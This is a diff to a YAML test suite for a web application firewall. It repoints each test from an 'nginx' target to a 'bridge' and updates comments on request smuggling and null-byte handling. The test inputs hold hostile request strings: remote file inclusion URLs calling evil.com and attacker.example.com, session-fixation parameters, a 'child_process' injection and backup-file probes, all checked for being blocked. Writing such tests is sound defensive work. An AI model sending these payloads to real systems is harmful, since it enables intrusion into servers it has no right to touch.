@@ -17,7 +17,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/index.php?file=http://evil.com/shell.txt"
@@ -34,7 +34,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/index.php?page=https://attacker.example.com/payload"
@@ -51,7 +51,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/index.php?file=readme.txt"
@@ -69,7 +69,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/index.php?PHPSESSID=stolen123"
@@ -86,7 +86,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/index.php?jsessionid=abcDEF"
@@ -103,7 +103,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/index.php?id=42"
@@ -121,7 +121,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/index.php"
@@ -138,7 +138,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/index.php"
@@ -151,9 +151,8 @@ tests:
 
   #      Rule 1105 HTTP Request Smuggling CL+TE (CRS 920181)
   # The block assertion lives in raw_tests.py (test_request_smuggling_cl_te_*)
-  # because nginx's handling of a chunked body with a non chunked payload is
-  # version dependent the request may be rejected by nginx (400) or blocked by
-  # the WAF (403). Either outcome is correct only a 200 would be a failure.
+  # because it needs duplicate CL/TE headers. The bridge forwards both headers
+  # and rule 1105 blocks at phase 1 -> 403.
 
   - test_id: 10
     test_title: "Allow POST with Content-Length only"
@@ -161,7 +160,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "POST"
             uri: "/post.php"
@@ -181,7 +180,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/index.php"
@@ -202,7 +201,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/index.php%00"
@@ -211,6 +210,8 @@ tests:
               Host: "localhost"
               Accept: "*/*"
           output:
+            # The bridge forwards the raw request target (literal "%00" text)
+            # as REQUEST_URI; rule 1107 matches %00. The WAF is the verifier.
             status: 403
 
   #      Rule 1108 Backup / working file access (CRS 920500)
@@ -220,7 +221,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/index.php.bak"
@@ -237,7 +238,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/config.old"
@@ -255,7 +256,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/leak.php?type=webshell"
@@ -272,7 +273,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/leak.php?type=webshell_cmd"
@@ -290,7 +291,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/leak.php?type=dirlist"
@@ -308,7 +309,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/leak.php?type=srcleak"
@@ -325,7 +326,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/leak.php?type=clean"
@@ -343,7 +344,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "GET"
             uri: "/index.php?q=require(%27child_process%27)"
@@ -361,7 +362,7 @@ tests:
     stages:
       - stage:
           input:
-            dest_addr: "nginx"
+            dest_addr: "bridge"
             port: 80
             method: "POST"
             uri: "/post.php"
